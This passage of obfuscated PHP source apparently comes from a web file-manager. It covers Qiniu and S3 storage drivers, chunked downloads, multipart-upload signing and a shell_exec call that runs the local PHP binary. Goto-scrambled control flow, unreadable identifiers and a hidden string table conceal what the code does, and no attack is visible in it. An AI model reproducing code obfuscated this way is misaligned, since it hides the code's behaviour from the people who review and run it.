{ goto DÁâ’¾Á…ø; DÁâ’¾Á…ø: $dˆ‘å¬Šˆ… =& $_SERVER[»„]; $f²Ñ–ì‘Òã = array(); if (is_array($FŸóòòªŒ§)) { foreach ($FŸóòòªŒ§ as $AÈ„Ï¾ç¦†) { $f²Ñ–ì‘Òã[] = $this->link($AÈ„Ï¾ç¦†); } } else { $f²Ñ–ì‘Òã[] = $this->link($FŸóòòªŒ§); } goto e“Ãœìƒ°; e“Ãœìƒ°: $dÉî½ëÕù = new Qiniu\Cdn\CdnManager($this->auth); list($f¦éîĞ©§Á, $b˜²©ëĞë’) = $dÉî½ëÕù->refreshUrls($f²Ñ–ì‘Òã); if ($b˜²©ëĞë’) { return !1; } goto aŠ‚·Øšˆî; aŠ‚·Øšˆî: return $f¦éîĞ©§Á[$dˆ‘å¬Šˆ…[1199]] == $dˆ‘å¬Šˆ…[684] ? !0 : !1; goto aá¾¢ÙÅ‚ì; aá¾¢ÙÅ‚ì: } public function fileSubstr($d·Şß¯š¥Ø, $FÃ®Šáùø´, $eŠô•ÖË¹Ò) { $aĞñä¿°à =& $_SERVER[»„]; if (!($E¬±Ó·õÎå = $this->link($d·Şß¯š¥Ø))) { return !1; } $eéÜº™ò¹° = !1; if ($eŠô•ÖË¹Ò > 0) { $Fáİœ…È· = $FÃ®Šáùø´ + $eŠô•ÖË¹Ò - 1; $eéÜº™ò¹° = array($aĞñä¿°à[1200] . $FÃ®Šáùø´ . $aĞñä¿°à[408] . $Fáİœ…È·); } $fö¿¯©‹ßŒ = url_request($E¬±Ó·õÎå, $aĞñä¿°à[212], !1, $eéÜº™ò¹°); return $fö¿¯©‹ßŒ[$aĞñä¿°à[677]] ? $fö¿¯©‹ßŒ[$aĞñä¿°à[1022]] : !1; } public function upload($C£ ±òÁ§Ç, $D„»Ğ÷ñéê, $e¶“ÏŒ¹» = false, $B¥ß×øÁ–è = REPEAT_REPLACE) { $eçòİ¢ğÂá = new Qiniu\Storage\UploadManager(); $F¾Ïƒ¢´ø¡ = $this->auth->uploadToken($this->bucket, $C£ ±òÁ§Ç); $eæñ¿ÈšôÚ = get_file_mime(get_path_ext($D„»Ğ÷ñéê)); list($DßŠâ°ì•ã, $EØ‰¾ÖÎ°Ô) = $eçòİ¢ğÂá->putFile($F¾Ïƒ¢´ø¡, $C£ ±òÁ§Ç, $D„»Ğ÷ñéê, null, $eæñ¿ÈšôÚ); return $EØ‰¾ÖÎ°Ô ? !1 : $this->getPathOuter($C£ ±òÁ§Ç); } public function uploadFormData($E†Ø‡ã¥, $fÙ‹°Œ…ÕÉ = 3600) { return $this->uploadToken($E†Ø‡ã¥, $fÙ‹°Œ…ÕÉ); } public function multiUploadFormData($E±ŠÆŸ¥Âñ, $c´©å¤¾Ó = 3600) { return $this->uploadToken($E±ŠÆŸ¥Âñ, $c´©å¤¾Ó); } private function uploadToken($BÕŒ‡–é›, $C®Š¨¿áµ = 3600) { goto F±ÕÎÕ­Ì·; e³Ú…·—ÀÌ: $c´ÏñßæÀŞ = null; $D†ĞÕôÃù® = $this->auth->uploadToken($this->bucket, $c´ÏñßæÀŞ, $Fó¾¾Ë”‰ˆ, $b±†ğ½ëù§, !0); $FçÕ¹é§Æ’ = empty($this->region) || $this->region == $f„Ş©ªƒĞÀ[1203] ? $f„Ş©ªƒĞÀ[33] : $f„Ş©ªƒĞÀ[408] . $this->region; goto CÆ¼Ä·Õæ; F±ÕÎÕ­Ì·: $f„Ş©ªƒĞÀ =& $_SERVER[»„]; $Fó¾¾Ë”‰ˆ = $C®Š¨¿áµ; $b±†ğ½ëù§ = array($f„Ş©ªƒĞÀ[1201] => $f„Ş©ªƒĞÀ[1202]); goto e³Ú…·—ÀÌ; CÆ¼Ä·Õæ: $f»ÙÈèÍ† = http_type() . "\x3a\57\x2f\165\160\154\157\141\x64{$FçÕ¹é§Æ’}\56\161\151\x6e\151\x75\x70\x2e\x63\x6f\x6d\57"; return array($f„Ş©ªƒĞÀ[1204] => $D†ĞÕôÃù®, $f„Ş©ªƒĞÀ[1205] => $f»ÙÈèÍ†); goto aÔÇŸÃÍÕÒ; aÔÇŸÃÍÕÒ: } public function download($D™ÙòÒÌÉ¸, $A¹…¶³”…†) { goto A²²–§‘Œë; cÇ­¡ŒĞö: $f²²ˆÁ³Æå = 1024 * 200; $aÏš–©ÑÁ— = fopen($f­â¡Çñ¯Ö, $_SERVER[»„][1206]); while (!0) { $EëÏÙøå“Š = $this->fileSubstr($D™ÙòÒÌÉ¸, $bê·Ö—ˆŒ, $f²²ˆÁ³Æå); if ($EëÏÙøå“Š === !1) { return !1; } fwrite($aÏš–©ÑÁ—, $EëÏÙøå“Š); $bê·Ö—ˆŒ += $f²²ˆÁ³Æå; if (strlen($EëÏÙøå“Š) < $f²²ˆÁ³Æå) { break; } } goto D‡ô¦á‘ÎÔ; D‡ô¦á‘ÎÔ: fclose($aÏš–©ÑÁ—); return $A¹…¶³”…†; goto a¿Î…“Ñ¸ ; A²²–§‘Œë: $f­â¡Çñ¯Ö = IO::getPathInner(IO::mkfile($A¹…¶³”…†)); if (!($a˜Æ‹èò‚„ = $this->link($D™ÙòÒÌÉ¸))) { return !1; } $bê·Ö—ˆŒ = 0; goto cÇ­¡ŒĞö; a¿Î…“Ñ¸ : } public function link($cÜÑ¨ÙƒÛ, $DÙè…ˆ‚ñŠ = '') { if (!$this->isFile($cÜÑ¨ÙƒÛ)) { return !1; } $fí’‡Ú’ŸÉ = $this->getHost() . $_SERVER[»„][8] . $this->pathEncode($cÜÑ¨ÙƒÛ) . $DÙè…ˆ‚ñŠ; return $this->auth->privateDownloadUrl($fí’‡Ú’ŸÉ, 3600 * 12); } public function fileOut($Cˆ­±¾Ûªæ, $Fçì¦¦Û‡Ğ = false, $FÜ•†ì›Îâ = false, $F›ñµŒ‘›Æ = '') { $bÅƒ¯ùãÏª =& $_SERVER[»„]; if (!$FÜ•†ì›Îâ) { $FÜ•†ì›Îâ = $this->pathThis($Cˆ­±¾Ûªæ); } $f˜®¿‘¡º¢ = $Fçì¦¦Û‡Ğ ? $bÅƒ¯ùãÏª[1207] . rawurlencode($FÜ•†ì›Îâ) : $bÅƒ¯ùãÏª[33]; $e–í¶¼¹¡é = $this->link($Cˆ­±¾Ûªæ, $f˜®¿‘¡º¢); $this->fileOutLink($e–í¶¼¹¡é); } public function fileOutServer($eö›àÙ—Œ, $Dù…ƒêŒãß = false, $b ïÆ“íë  = false, $FŞˆåØ˜‡ = '') { parent::fileOut($eö›àÙ—Œ, $Dù…ƒêŒãß, $b ïÆ“íë , $FŞˆåØ˜‡); } public function fileOutImage($d¤ÅÂµàÍÛ, $fè¨ªÆŠùù = 250) { $CğÄˆ˜İÂ¿ = $this->link($d¤ÅÂµàÍÛ, $_SERVER[»„][1208] . $fè¨ªÆŠùù); $this->fileOutLink($CğÄˆ˜İÂ¿); } public function fileOutImageServer($bÑÇïïÎêÌ, $Eî­êñŠó¢ = 250) { parent::fileOutImage($bÑÇïïÎêÌ, $Eî­êñŠó¢); } public function hashMd5($a’šì™¶ËÛ) { $eŞ´ê™Š·‚ =& $_SERVER[»„]; $dİÓ‰ƒ¤ˆÜ = $this->objectMeta($a’šì™¶ËÛ); return isset($dİÓ‰ƒ¤ˆÜ[$eŞ´ê™Š·‚[192]]) ? $dİÓ‰ƒ¤ˆÜ[$eŞ´ê™Š·‚[192]] : !1; $B¡À­ÂÒ¹¸ = $this->link($a’šì™¶ËÛ, $eŞ´ê™Š·‚[1209]); } public function size($EÛ³…‰ÚË’) { $c“¸‡ÛÙÜ = $this->objectMeta($EÛ³…‰ÚË’); return $c“¸‡ÛÙÜ ? $c“¸‡ÛÙÜ[$_SERVER[»„][77]] : 0; } public function info($Aåó®×Õùğ) { if ($this->isFolder($Aåó®×Õùğ)) { return $this->folderInfo($Aåó®×Õùğ); } else { if ($this->isFile($Aåó®×Õùğ)) { return $this->fileInfo($Aåó®×Õùğ); } } return !1; } public function exist($B’¸¶Ğù…ğ) { return $this->isFile($B’¸¶Ğù…ğ) || $this->isFolder($B’¸¶Ğù…ğ); } public function isFile($b²©»îÇª) { return !$this->isFolder($b²©»îÇª) && $this->objectMeta($b²©»îÇª); } public function isFolder($cî ‚ŒŠ«±) { return $this->cacheMethod($_SERVER[»„][219], $cî ‚ŒŠ«±); } protected function objectMeta($FŠš‹»èï) { return $this->cacheMethod($_SERVER[»„][220], $FŠš‹»èï); } protected function _objectMeta($e·Ñ‹Û¶áô) { $A·‡â–‚Øá =& $_SERVER[»„]; list($b”µ©á³Øì, $B‡¹ßˆ¡é®) = $this->bucketManager->stat($this->bucket, $e·Ñ‹Û¶áô); if ($b”µ©á³Øì) { $b”µ©á³Øì[$A·‡â–‚Øá[77]] = intval($b”µ©á³Øì[$A·‡â–‚Øá[1196]]); } return $b”µ©á³Øì; } protected function _isFolder($BšÛ•¤¾š») { $CÓß¨İŞ =& $_SERVER[»„]; list($bŞ£‰‹Ê³’, $BŸ‘Šª Á¨) = $this->bucketManager->listFiles($this->bucket, trim($BšÛ•¤¾š», $CÓß¨İŞ[8]) . $CÓß¨İŞ[8], $CÓß¨İŞ[33], 1, $CÓß¨İŞ[8]); return !empty($bŞ£‰‹Ê³’[$CÓß¨İŞ[1195]]) || !empty($bŞ£‰‹Ê³’[$CÓß¨İŞ[1198]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($DƒĞ‹…êœ) { parent::__construct($DƒĞ‹…êœ); } public function uploadFormData($b¦¸Ã¿ŒŒà, $C¦½‡¦ï›ƒ = 3600) { goto a–‹ÛËšˆÁ; D…Â× ëÆ: $d ×‡Óè‘Ï = array($fºÎ¸ĞŒÉ³[195] => $fºÎ¸ĞŒÉ³[33], $fºÎ¸ĞŒÉ³[1126] => $fºÎ¸ĞŒÉ³[33], $fºÎ¸ĞŒÉ³[1085] => $e¬ä£‘É±, $fºÎ¸ĞŒÉ³[1089] => $e’Ÿï¹ğ÷¡, $fºÎ¸ĞŒÉ³[1093] => $C—¯£„æ, $fºÎ¸ĞŒÉ³[1127] => $a“¾È±èÍÑ, $fºÎ¸ĞŒÉ³[1128] => $b¼á†öí‰, $fºÎ¸ĞŒÉ³[1129] => $Fà‚­Ó®²‘, $fºÎ¸ĞŒÉ³[1130] => $aâé¯Ï®˜, $fºÎ¸ĞŒÉ³[1131] => $DßÆ¬‘‘÷ï, $fºÎ¸ĞŒÉ³[165] => $this->getHost()); return $d ×‡Óè‘Ï; goto FêÛµ¦†Àè; b“ÉÊ¼°¯: $bİœ»ö¤ôî = hash_hmac($fºÎ¸ĞŒÉ³[1124], $fìŠâŠ‰ˆØ, $eæ¡ñáÄ³ô, !0); $c‡í´‡ˆœõ = hash_hmac($fºÎ¸ĞŒÉ³[1124], $AİÀãì™í, $bİœ»ö¤ôî, !0); $DßÆ¬‘‘÷ï = hash_hmac($fºÎ¸ĞŒÉ³[1124], $C—¯£„æ, $c‡í´‡ˆœõ); goto D…Â× ëÆ; E³ŞÍÒ: $C—¯£„æ = base64_encode(json_encode($aä¡ùÉ‡¬Ê)); $CàßÍêš¶Ô = hash_hmac($fºÎ¸ĞŒÉ³[1124], $bíğ«„Ùªğ, $fºÎ¸ĞŒÉ³[1125] . $this->secret, !0); $eæ¡ñáÄ³ô = hash_hmac($fºÎ¸ĞŒÉ³[1124], $this->region, $CàßÍêš¶Ô, !0); goto b“ÉÊ¼°¯; Aµ´¡¸¥Ñ: $EŠØÇŠˆÆ­ = array($this->accessKey, $bíğ«„Ùªğ, $this->region, $fìŠâŠ‰ˆØ, $AİÀãì™í); $a“¾È±èÍÑ = implode($fºÎ¸ĞŒÉ³[8], $EŠØÇŠˆÆ­); $aä¡ùÉ‡¬Ê = array($fºÎ¸ĞŒÉ³[1083] => gmdate($fºÎ¸ĞŒÉ³[1082], strtotime($fºÎ¸ĞŒÉ³[1117])), $fºÎ¸ĞŒÉ³[1084] => array(array($fºÎ¸ĞŒÉ³[1086] => $this->bucket), array($fºÎ¸ĞŒÉ³[1085] => $e¬ä£‘É±), array($fºÎ¸ĞŒÉ³[1087], $fºÎ¸ĞŒÉ³[1088], $fºÎ¸ĞŒÉ³[33]), array($fºÎ¸ĞŒÉ³[1087], $fºÎ¸ĞŒÉ³[1118], $fºÎ¸ĞŒÉ³[33]), array($fºÎ¸ĞŒÉ³[1087], $fºÎ¸ĞŒÉ³[1119], $fºÎ¸ĞŒÉ³[33]), array($fºÎ¸ĞŒÉ³[1089] => $e’Ÿï¹ğ÷¡), array($fºÎ¸ĞŒÉ³[1120] => $a“¾È±èÍÑ), array($fºÎ¸ĞŒÉ³[1121] => $b¼á†öí‰), array($fºÎ¸ĞŒÉ³[1122] => $Fà‚­Ó®²‘), array($fºÎ¸ĞŒÉ³[1123] => $aâé¯Ï®˜))); goto E³ŞÍÒ; D·œªËˆñ“: $fìŠâŠ‰ˆØ = $fºÎ¸ĞŒÉ³[59]; $Fà‚­Ó®²‘ = gmdate($fºÎ¸ĞŒÉ³[1115]); $bíğ«„Ùªğ = gmdate($fºÎ¸ĞŒÉ³[678]); goto C°Ãä¸ßé; a–‹ÛËšˆÁ: $fºÎ¸ĞŒÉ³ =& $_SERVER[»„]; $e¬ä£‘É± = $fºÎ¸ĞŒÉ³[181]; $b¼á†öí‰ = $fºÎ¸ĞŒÉ³[1114]; goto D·œªËˆñ“; C°Ãä¸ßé: $AİÀãì™í = $fºÎ¸ĞŒÉ³[1116]; $aâé¯Ï®˜ = $C¦½‡¦ï›ƒ . $fºÎ¸ĞŒÉ³[33]; $e’Ÿï¹ğ÷¡ = $fºÎ¸ĞŒÉ³[1081]; goto Aµ´¡¸¥Ñ; FêÛµ¦†Àè: } public function multiUploadFormData($B°åìÒ›â…, $Cöáì’Ì½Ì = 3600) { $fŒ¬ñ¶ù» =& $_SERVER[»„]; $dæ”Ç´‘‡ = gmdate($fŒ¬ñ¶ù»[1210]); $b¹õ°Ìù› = array(); $fœ‡×š·£ = $this->client->getUploadId($this->bucket, $B°åìÒ›â…, $b¹õ°Ìù›); if (!$fœ‡×š·£) { return !1; } return array($fŒ¬ñ¶ù»[205] => $fœ‡×š·£, $fŒ¬ñ¶ù»[165] => $this->getHost() . $fŒ¬ñ¶ù»[8] . $this->pathEncode($B°åìÒ›â…), $fŒ¬ñ¶ù»[206] => $dæ”Ç´‘‡, $fŒ¬ñ¶ù»[89] => $B°åìÒ›â…); } public function multiUploadAuthData($D§Í‡³”›–, $fÎÜµ°Î‰Ò = array()) { goto còÉ‘Î—ó; F««›Âœ: if (isset($fÎÜµ°Î‰Ò[$a­¾‚Ğ¼¼Ğ[1211]])) { $aÔ“ÄÓÆŒØ[$a­¾‚Ğ¼¼Ğ[1212]] = $fÎÜµ°Î‰Ò[$a­¾‚Ğ¼¼Ğ[1211]]; } $A¾†Å‹¦çµ = explode($a­¾‚Ğ¼¼Ğ[167], $this->getHost()); $bÀÛ©ß¢Áå = array($a­¾‚Ğ¼¼Ğ[1213] => $A¾†Å‹¦çµ[1], $a­¾‚Ğ¼¼Ğ[1214] => $a­¾‚Ğ¼¼Ğ[33], $a­¾‚Ğ¼¼Ğ[195] => $a­¾‚Ğ¼¼Ğ[115], $a­¾‚Ğ¼¼Ğ[1126] => $fÎÜµ°Î‰Ò[$a­¾‚Ğ¼¼Ğ[77]]); goto FƒÂŸ™çÈ; còÉ‘Î—ó: $a­¾‚Ğ¼¼Ğ =& $_SERVER[»„]; $e˜‰šÌŸ‰ˆ = isset($fÎÜµ°Î‰Ò[$a­¾‚Ğ¼¼Ğ[156]]) ? $fÎÜµ°Î‰Ò[$a­¾‚Ğ¼¼Ğ[156]] : $a­¾‚Ğ¼¼Ğ[33]; $F¹È¯ä›‰Ó = $fÎÜµ°Î‰Ò[$a­¾‚Ğ¼¼Ğ[89]]; goto eÕ·èÚ°ÑÛ; EÏœçá¥ÖØ: if (strpos($e˜‰šÌŸ‰ˆ, $a­¾‚Ğ¼¼Ğ[209]) === 0) { if (isset($aÔ“ÄÓÆŒØ[$a­¾‚Ğ¼¼Ğ[1212]])) { $AÔ„Ñ©áÚ = $aÔ“ÄÓÆŒØ[$a­¾‚Ğ¼¼Ğ[1212]]; } else { if (isset($fòÕàë„®¦[$a­¾‚Ğ¼¼Ğ[1212]])) { $AÔ„Ñ©áÚ = $fòÕàë„®¦[$a­¾‚Ğ¼¼Ğ[1212]]; } else { $AÔ„Ñ©áÚ = hash($a­¾‚Ğ¼¼Ğ[1124], $a­¾‚Ğ¼¼Ğ[33]); } } return array($a­¾‚Ğ¼¼Ğ[216] => $fòÕàë„®¦[$a­¾‚Ğ¼¼Ğ[216]], $a­¾‚Ğ¼¼Ğ[1212] => $AÔ„Ñ©áÚ, $a­¾‚Ğ¼¼Ğ[206] => $fòÕàë„®¦[$a­¾‚Ğ¼¼Ğ[1215]]); } return $fòÕàë„®¦[$a­¾‚Ğ¼¼Ğ[216]]; goto aË¥ˆº¸ç; FƒÂŸ™çÈ: $Aœ›ˆğòŒ¼ = $a­¾‚Ğ¼¼Ğ[210]; $F­Š…ÈáÈ = $a­¾‚Ğ¼¼Ğ[8] . $this->pathEncode($F¹È¯ä›‰Ó) . $e˜‰šÌŸ‰ˆ; $fòÕàë„®¦ = $this->client->__getSignatureV4($aÔ“ÄÓÆŒØ, $bÀÛ©ß¢Áå, $Aœ›ˆğòŒ¼, $F­Š…ÈáÈ); goto EÏœçá¥ÖØ; eÕ·èÚ°ÑÛ: unset($fÎÜµ°Î‰Ò[$a­¾‚Ğ¼¼Ğ[89]]); if (isset($fÎÜµ°Î‰Ò[$a­¾‚Ğ¼¼Ğ[207]])) { return $this->listUploadParts($F¹È¯ä›‰Ó, $fÎÜµ°Î‰Ò); } $aÔ“ÄÓÆŒØ = array(); goto F««›Âœ; aË¥ˆº¸ç: } public function listUploadParts($b îÙÄ¾‘, $a†”ô®æ„Ø = array()) { goto e£ÃÜ¼ø·‚; aÖÃ Ñìˆ®: $BÛĞÆøÚ™¦ = array($f’»İ£¼ñ“[1213] => $Eœé É²È[1], $f’»İ£¼ñ“[195] => $f’»İ£¼ñ“[115], $f’»İ£¼ñ“[1126] => strlen($Cïö›¹Û‚æ)); $eíÂƒÏèÛ = $f’»İ£¼ñ“[208]; $d¹ˆµ¹’ó° = $f’»İ£¼ñ“[8] . $this->pathEncode($b îÙÄ¾‘) . $a†”ô®æ„Ø[$f’»İ£¼ñ“[156]]; goto BĞĞ…â´õÖ; b Š½»»…: $Cïö›¹Û‚æ .= $f’»İ£¼ñ“[1219]; $B­È£°ª‰ì = array(); $Eœé É²È = explode($f’»İ£¼ñ“[167], $this->getHost()); goto aÖÃ Ñìˆ®; a´Šå†œœ: if (!$bŒóˆš¹ø¨) { return !1; } $Cïö›¹Û‚æ = $f’»İ£¼ñ“[1216]; foreach ($bŒóˆš¹ø¨ as $b¡âæ™ùƒ²) { $Cïö›¹Û‚æ .= $f’»İ£¼ñ“[1217] . "\x3c\120\141\162\164\116\x75\x6d\x62\145\x72\76{$b¡âæ™ùƒ²[$f’»İ£¼ñ“[1168]]}\x3c\x2f\x50\x61\162\x74\116\x75\x6d\x62\x65\162\76\12" . "\74\105\124\x61\x67\x3e{$b¡âæ™ùƒ²[$f’»İ£¼ñ“[1169]]}\74\57\x45\x54\141\147\76\xa" . $f’»İ£¼ñ“[1218]; } goto b Š½»»…; e£ÃÜ¼ø·‚: $f’»İ£¼ñ“ =& $_SERVER[»„]; $e£ôàƒ¶ê = str_replace($f’»İ£¼ñ“[217], $f’»İ£¼ñ“[33], $a†”ô®æ„Ø[$f’»İ£¼ñ“[156]]); $bŒóˆš¹ø¨ = $this->client->listParts($this->bucket, $b îÙÄ¾‘, $e£ôàƒ¶ê); goto a´Šå†œœ; BĞĞ…â´õÖ: $B˜â´õ¼¤ç = $this->client->__getSignatureV4($B­È£°ª‰ì, $BÛĞÆøÚ™¦, $eíÂƒÏèÛ, $d¹ˆµ¹’ó°, $Cïö›¹Û‚æ); return array($f’»İ£¼ñ“[216] => $B˜â´õ¼¤ç[$f’»İ£¼ñ“[216]], $f’»İ£¼ñ“[206] => $B˜â´õ¼¤ç[$f’»İ£¼ñ“[1215]], $f’»İ£¼ñ“[218] => $bŒóˆš¹ø¨, $f’»İ£¼ñ“[1212] => $B˜â´õ¼¤ç[$f’»İ£¼ñ“[1212]]); goto D¿ŞÑÜšš‘; D¿ŞÑÜšš‘: } public function link($a‘‚ŒŞØÍæ, $EÀÕ†éÚ„‡ = array()) { return parent::link($a‘‚ŒŞØÍæ, $EÀÕ†éÚ„‡); } public function fileOut($eËÍÈ§Ï, $AæÊÄ†Ù ä = false, $eÍˆÄÑÃˆ = false, $EÇ¹›°Şß = '') { if (strstr($this->endpoint, $_SERVER[»„][1220])) { return parent::fileOutServer($eËÍÈ§Ï, $AæÊÄ†Ù ä, $eÍˆÄÑÃˆ, $EÇ¹›°Şß); } parent::fileOut($eËÍÈ§Ï, $AæÊÄ†Ù ä, $eÍˆÄÑÃˆ, $EÇ¹›°Şß); } public function fileOutImage($cÔ«èºõ©, $A½ÄŞŠ¥ = 250) { if (strstr($this->endpoint, $_SERVER[»„][1220])) { return parent::fileOutImageServer($cÔ«èºõ©, $A½ÄŞŠ¥); } parent::fileOutImage($cÔ«èºõ©, $A½ÄŞŠ¥); } public function fileOutLink($E°ñÄ›‰ãŠ) { $FÙ÷Õèº»Ş =& $_SERVER[»„]; if (substr($E°ñÄ›‰ãŠ, 0, 7) == $FÙ÷Õèº»Ş[1096]) { $E°ñÄ›‰ãŠ = $FÙ÷Õèº»Ş[1097] . substr($E°ñÄ›‰ãŠ, 7); } header($FÙ÷Õèº»Ş[152] . $E°ñÄ›‰ãŠ); die; } public function getHost() { $d›ôëï°‚ =& $_SERVER[»„]; $DùğíÜÂì = str_rtrim(parent::getHost(), $d›ôëï°‚[8] . $this->bucket); $DùğíÜÂì = explode($d›ôëï°‚[167], $DùğíÜÂì); return $DùğíÜÂì[0] . $d›ôëï°‚[167] . $this->bucket . $d›ôëï°‚[91] . $DùğíÜÂì[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Dïˆ…÷ùÃ¶, $f±½ìì…éÓ = 0) { parent::__construct(); $this->source = $Dïˆ…÷ùÃ¶; $this->sourceSize = $f±½ìì…éÓ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($C¾‚÷Ï„¤ù = false) { return $this->sourceSize; } public function getContent($aæÍŠ×Ğ– = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $f‰‘¯¯ôÄ§ = ftell($this->source); $fà´èÍàö† = @fread($this->source, $this->sourceSize); fseek($this->source, $f‰‘¯¯ôÄ§); return $fà´èÍàö†; } } public function fileSubstr($bÓ§…ƒ³¦ = false, $fß†â·ÍŞ¤ = 0, $eÄ¶­ÕÈÆ = 0) { if (!$eÄ¶­ÕÈÆ) { $eÄ¶­ÕÈÆ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $fß†â·ÍŞ¤, $eÄ¶­ÕÈÆ); } if ($this->sourceType == self::TYPE_FILE) { $fùÓçšîÙ = ftell($this->source); fseek($this->source, $fùÓçšîÙ + $fß†â·ÍŞ¤); $f•…‹†×©Ê = @fread($this->source, $eÄ¶­ÕÈÆ); fseek($this->source, $fùÓçšîÙ); return $f•…‹†×©Ê; } } public function hashMd5($d¸ˆ–¼íà = false) { return md5($this->getContent()); } public static function hash($f´Ê„¤ÜÛ‰, $dÛ²¡ª¸Œ´ = 0) { $F¤’Æ‡é¹„ = new PathDriverStream($f´Ê„¤ÜÛ‰, $dÛ²¡ª¸Œ´); return $F¤’Æ‡é¹„->hashSimple($f´Ê„¤ÜÛ‰); } public static function md5($CÁ”ó¥§»‚, $b™¿Ó˜‡†  = 0) { $E³ç‹·ØÏ¨ = new PathDriverStream($CÁ”ó¥§»‚, $b™¿Ó˜‡† ); return $E³ç‹·ØÏ¨->hashMd5($CÁ”ó¥§»‚); } } goto EÕ«°¡Ë‰¦; cò÷†ÈÔ¬ï: function ActionCall($dÌ‰øß†Å) { $aÀ‘Ş÷ó‚š = array_slice(func_get_args(), 1); return ActionApply($dÌ‰øß†Å, $aÀ‘Ş÷ó‚š); } function ActionCallApi($fâæ°í‹ÜŸ, $A§îÕ·ÅÎ™ = '') { goto aŠ²ÇÛµÓÜ; b…İìâËáå: $fÌŠÇÓ‚“œ = Action($Bˆ†ª½µê[23])->accessToken(); $fâæ°í‹ÜŸ = str_replace($Bˆ†ª½µê[5], $Bˆ†ª½µê[4], $fâæ°í‹ÜŸ) . $Bˆ†ª½µê[24] . $fÌŠÇÓ‚“œ . $b‹ƒĞ¨àËÔ; $c‚×§í‹Æì = $Bˆ†ª½µê[20]; goto B’†ˆÊÅ™Ç; E–ªŠÃ¿­Ù: return $EÇÉ¾Âê¦; goto b­Ç¸ì¤®œ; aŠ²ÇÛµÓÜ: $Bˆ†ª½µê =& $_SERVER[ÓÊÌ]; $b‹ƒĞ¨àËÔ = $A§îÕ·ÅÎ™; if (is_array($A§îÕ·ÅÎ™)) { $b‹ƒĞ¨àËÔ = $Bˆ†ª½µê[20]; foreach ($A§îÕ·ÅÎ™ as $b‹À·Ê±²Ã => $E‹Ü˜‹ÛÏ) { $E‹Ü˜‹ÛÏ = is_array($E‹Ü˜‹ÛÏ) ? json_encode($E‹Ü˜‹ÛÏ) : $E‹Ü˜‹ÛÏ; $E‹Ü˜‹ÛÏ = is_bool($E‹Ü˜‹ÛÏ) ? intval($E‹Ü˜‹ÛÏ) : $E‹Ü˜‹ÛÏ; $b‹ƒĞ¨àËÔ .= $Bˆ†ª½µê[21] . $b‹À·Ê±²Ã . $Bˆ†ª½µê[22] . rawurlencode($E‹Ü˜‹ÛÏ); } } goto b…İìâËáå; bÏã°¶…à­: $fŒÅ¤áØÎ = json_decode($c‚×§í‹Æì, !0); $EÇÉ¾Âê¦ = is_array($fŒÅ¤áØÎ) ? $fŒÅ¤áØÎ : array($Bˆ†ª½µê[33] => null, $Bˆ†ª½µê[34] => $c‚×§í‹Æì); if (!$fŒÅ¤áØÎ) { echo $c‚×§í‹Æì; } goto E–ªŠÃ¿­Ù; B’†ˆÊÅ™Ç: $bŒº‚³† = phpBinCommand(); if ($bŒº‚³† && function_exists($Bˆ†ª½µê[25])) { $aå­ËŒØÉÖ = $bŒº‚³† . $Bˆ†ª½µê[26] . BASIC_PATH . $Bˆ†ª½µê[27] . escapeshellarg($fâæ°í‹ÜŸ); $c‚×§í‹Æì = shell_exec($aå­ËŒØÉÖ); } if (!$c‚×§í‹Æì) { $fëÆ†‰Ù˜Ş = stream_context_create(array($Bˆ†ª½µê[28] => array($Bˆ†ª½µê[29] => 20, $Bˆ†ª½µê[30] => $Bˆ†ª½µê[31]))); $c‚×§í‹Æì = file_get_contents(APP_HOST . $Bˆ†ª½µê[32] . $fâæ°í‹ÜŸ, !1, $fëÆ†‰Ù˜Ş); } goto bÏã°¶…à­; b­Ç¸ì¤®œ: } function ActionCallHook($bøœ£¢—Æ) { goto Cˆˆ÷Şí; Cˆˆ÷Şí: $F–…Æ¨”Á =& $_SERVER[ÓÊÌ]; ob_start(); $aÚæ¸²ë’ = array_slice(func_get_args(), 1); goto CöÂí•ÜŞ‰; CöÂí•ÜŞ‰: $GLOBALS[$F–…Æ¨”Á[35]] = 1; $bÙµ ÖµÁ = ActionApply($bøœ£¢—Æ, $aÚæ¸²ë’); $E‘Ô‘ãÇ—“ = ob_get_clean(); goto fõõ¼³Äöª; fõõ¼³Äöª: $bÙµ ÖµÁ = $E‘Ô‘ãÇ—“ ? json_decode($E‘Ô‘ãÇ—“, !0) : $bÙµ ÖµÁ; $GLOBALS[$F–…Æ¨”Á[35]] = 0; return $bÙµ ÖµÁ; goto cĞ´¯„ŒÒÄ; cĞ´¯„ŒÒÄ: } goto DÜÁï’¥; a„å±áÃ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\146\141\x76"; protected function cacheFunctionAlias($A½É£ã×ÓË) { $C™íˆš“Ü =& $_SERVER[»„]; return array($C™íˆš“Ü[2453] => array(USER_ID, $C™íˆš“Ü[2509])); } protected function listData() { $EÃÓÑŒÌ¬ =& $_SERVER[»„]; $D¡Èñ™ÃÀ‘ = array($EÃÓÑŒÌ¬[1400] => USER_ID, $EÃÓÑŒÌ¬[432] => array($EÃÓÑŒÌ¬[2510], 0)); $FŒôæƒŠ„ = $EÃÓÑŒÌ¬[2511]; $EŠ–Ğ†Æ… = $EÃÓÑŒÌ¬[2512]; $e…èò´ó‹¥ = $this->field($FŒôæƒŠ„)->where($D¡Èñ™ÃÀ‘)->order($EŠ–Ğ†Æ…)->select(); return $e…èò´ó‹¥ ? $e…èò´ó‹¥ : array(); } protected function listByTag($c¶Ê—¨™Õ) { } protected function addToTag($F²‡ùò¿ç†, $aå¦øíÒñ) { $FôÆ‘”Ä¥Œ =& $_SERVER[»„]; if (!Model($FôÆ‘”Ä¥Œ[2280])->listData($aå¦øíÒñ) || !Model($FôÆ‘”Ä¥Œ[740])->pathInfo($F²‡ùò¿ç†)) { return !1; } $aÔ¥Íñ¹ = array($FôÆ‘”Ä¥Œ[1400] => USER_ID, $FôÆ‘”Ä¥Œ[432] => $aå¦øíÒñ, $FôÆ‘”Ä¥Œ[383] => $F²‡ùò¿ç†, $FôÆ‘”Ä¥Œ[384] => $FôÆ‘”Ä¥Œ[378], $FôÆ‘”Ä¥Œ[382] => $FôÆ‘”Ä¥Œ[33], $FôÆ‘”Ä¥Œ[2076] 